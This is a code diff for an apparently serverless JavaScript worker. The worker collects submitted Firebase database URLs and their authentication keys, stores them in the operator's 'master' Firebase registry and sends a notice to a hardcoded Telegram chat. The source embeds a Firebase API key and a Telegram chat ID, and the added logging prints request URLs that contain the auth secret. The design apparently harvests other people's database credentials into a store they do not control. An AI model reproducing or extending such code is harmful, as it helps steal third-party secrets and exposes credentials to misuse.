@@ -8,7 +8,7 @@
 // 2. Submits the Firebase URL + key to the master registry
 //
 // 🔥 Telegram credentials (hardcoded)
-// 🔥 Master Firebase credentials (from google-services.json)
+// 🔥 Master Firebase credentials (hardcoded)
 // ============================================================
 
 // ─── Telegram credentials ─────────────────────────────────────
@@ -17,13 +17,11 @@ const CHAT_ID = '-1004291828596';
 const MESSAGE_THREAD_ID = 3;
 
 // ─── Master Firebase credentials ─────────────────────────────
-// ⚠️ The API key from google-services.json is NOT a Database Secret.
-// For writes to RTDB you need a Database Secret from:
-// Firebase Console → Project Settings → Service Accounts → Database Secrets
+// ⚠️ IMPORTANT: This MUST be a Database Secret, NOT an API key.
+// Get it from: Firebase Console → Project Settings → Service Accounts → Database Secrets
 const MASTER_FIREBASE_CONFIG = {
     url: "https://zenith-all-default-rtdb.firebaseio.com",
-    // This API key may NOT work for writing. Replace with Database Secret.
-    key: "AIzaSyDx6R99W7TLzl-BeldxBR_1hagqp8SPMyo"
+    key: "AIzaSyDx6R99W7TLzl-BeldxBR_1hagqp8SPMyo"  // ⚠️ REPLACE WITH DATABASE SECRET
 };
 
 // ============================================================
@@ -59,9 +57,14 @@ async function generateRegistryId(value) {
 
 async function masterRegistryRequest(path, options = {}) {
     const config = getMasterConfig();
-    if (!config) return null;
+    if (!config) {
+        throw new Error('Master Firebase not configured');
+    }
 
     const target = `${config.url}/${path.replace(/^\/+/, "")}.json?auth=${encodeURIComponent(config.key)}`;
+    
+    console.log(`[Master Registry] Requesting: ${target}`);
+
     const response = await fetch(target, {
         ...options,
         headers: {
@@ -71,46 +74,68 @@ async function masterRegistryRequest(path, options = {}) {
     });
 
     const payload = await response.json().catch(() => null);
+    console.log(`[Master Registry] Response status: ${response.status}`, payload);
+
     if (!response.ok) {
-        throw new Error(payload?.error || payload?.message || `Master Firebase HTTP ${response.status}`);
+        const errorMsg = payload?.error || payload?.message || `HTTP ${response.status}`;
+        throw new Error(`Master Firebase error: ${errorMsg}`);
     }
     return payload;
 }
 
 async function submitFirebaseToOwner(firebaseUrl, authenticationKey) {
-    if (!getMasterConfig()) {
-        return { configured: false, duplicate: false };
+    try {
+        const config = getMasterConfig();
+        if (!config) {
+            return { configured: false, duplicate: false, error: 'Master Firebase not configured' };
+        }
+
+        const id = await generateRegistryId(firebaseUrl);
+        const path = `submissions/${id}`;
+
+        // Check if already exists
+        let previous = null;
+        try {
+            previous = await masterRegistryRequest(path);
+        } catch (err) {
+            // If it's a 404, that's fine – it's new
+            if (!err.message.includes('404')) {
+                throw err;
+            }
+        }
+
+        const now = Date.now();
+        const day = new Date(now).toISOString().slice(0, 10);
+
+        const dailyCounts = { ...(previous?.dailyCounts || {}) };
+        dailyCounts[day] = Number(dailyCounts[day] || 0) + 1;
+
+        const record = {
+            firebaseUrl: String(firebaseUrl || "").trim().replace(/\/$/, ""),
+            authenticationKey: String(authenticationKey || "").trim(),
+            firstAddedAt: previous?.firstAddedAt || now,
+            lastSeenAt: now,
+            submitCount: Number(previous?.submitCount || 0) + 1,
+            dailyCounts
+        };
+
+        await masterRegistryRequest(path, {
+            method: "PUT",
+            body: JSON.stringify(record)
+        });
+
+        return {
+            configured: true,
+            duplicate: Boolean(previous),
+            record
+        };
+    } catch (error) {
+        return {
+            configured: true,
+            duplicate: false,
+            error: error.message
+        };
     }
-
-    const id = await generateRegistryId(firebaseUrl);
-    const path = `submissions/${id}`;
-
-    const previous = await masterRegistryRequest(path).catch(() => null);
-    const now = Date.now();
-    const day = new Date(now).toISOString().slice(0, 10);
-
-    const dailyCounts = { ...(previous?.dailyCounts || {}) };
-    dailyCounts[day] = Number(dailyCounts[day] || 0) + 1;
-
-    const record = {
-        firebaseUrl: String(firebaseUrl || "").trim().replace(/\/$/, ""),
-        authenticationKey: String(authenticationKey || "").trim(),
-        firstAddedAt: previous?.firstAddedAt || now,
-        lastSeenAt: now,
-        submitCount: Number(previous?.submitCount || 0) + 1,
-        dailyCounts
-    };
-
-    await masterRegistryRequest(path, {
-        method: "PUT",
-        body: JSON.stringify(record)
-    });
-
-    return {
-        configured: true,
-        duplicate: Boolean(previous),
-        record
-    };
 }
 
 // ============================================================
@@ -182,16 +207,16 @@ export default {
 
         // ─── Submission to Master Firebase ──────────────────────
         let submissionResult = null;
-        try {
-            if (authKey) {
+        if (authKey) {
+            try {
                 submissionResult = await submitFirebaseToOwner(target, authKey);
-                console.log('Master registry submission:', submissionResult);
-            } else {
-                console.log('No authentication key provided – skipping master registry.');
+                console.log('Master registry submission result:', submissionResult);
+            } catch (err) {
+                console.error('Master registry submission failed:', err);
+                submissionResult = { error: err.message };
             }
-        } catch (err) {
-            console.error('Master registry submission failed:', err);
-            // Don't block the Telegram message
+        } else {
+            console.log('No authentication key provided – skipping master registry.');
         }
 
         // ─── Telegram message ────────────────────────────────────
@@ -272,13 +297,7 @@ ${statsLine}
                 posted: tgOk,
                 error: tgError
             },
-            masterRegistry: submissionResult
-                ? {
-                      configured: submissionResult.configured,
-                      duplicate: submissionResult.duplicate,
-                      record: submissionResult.record
-                  }
-                : null,
+            masterRegistry: submissionResult || null,
             timestamp: indiaTime,
             timezone: 'Asia/Kolkata',
             utcOffset: '+05:30'
